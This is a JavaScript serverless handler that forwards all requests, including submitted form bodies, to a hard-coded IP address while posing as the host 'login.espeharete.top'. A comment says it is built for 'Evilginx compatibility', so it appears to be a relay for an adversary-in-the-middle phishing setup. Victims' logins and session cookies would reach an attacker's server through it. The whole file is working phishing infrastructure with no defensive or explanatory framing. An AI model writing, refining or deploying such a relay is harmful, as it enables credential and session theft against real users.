import https from 'https';

export default function handler(req, res) {
  return new Promise((resolve) => {
    const targetHost = '185.165.171.174';
    const targetPath = req.url || '/';
    
    // Perfect headers for Evilginx compatibility
    const headers = {
      'Host': 'login.espeharete.top',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Connection': 'keep-alive',
      'Upgrade-Insecure-Requests': '1',
      'X-Forwarded-For': req.headers['x-forwarded-for'] || req.ip,
      'X-Real-IP': req.ip
    };

    const options = {
      hostname: targetHost,
      port: 443,
      path: targetPath,
      method: req.method,
      headers: headers,
      rejectUnauthorized: false,
      timeout: 8000 // 8 second timeout
    };

    const proxyReq = https.request(options, (proxyRes) => {
      // Filter out problematic headers
      const safeHeaders = { ...proxyRes.headers };
      ['content-length', 'transfer-encoding'].forEach(h => delete safeHeaders[h]);
      
      try {
        res.writeHead(proxyRes.statusCode || 200, safeHeaders);
        proxyRes.pipe(res);
      } catch (pipeError) {
        console.error('Pipe error:', pipeError);
        res.status(500).end();
        return resolve();
      }
      
      proxyRes.on('end', () => resolve());
    });

    proxyReq.on('error', (err) => {
      console.error('Proxy request error:', err);
      if (!res.headersSent) {
        res.status(502).json({ 
          error: 'Bad Gateway',
          message: err.message,
          code: err.code
        });
      }
      resolve();
    });

    proxyReq.on('timeout', () => {
      console.error('Proxy request timeout');
      proxyReq.destroy();
      if (!res.headersSent) {
        res.status(504).json({ error: 'Gateway Timeout' });
      }
      resolve();
    });

    // Handle request body if present
    if (req.method === 'POST' || req.method === 'PUT') {
      req.pipe(proxyReq);
    } else {
      proxyReq.end();
    }
  });
}
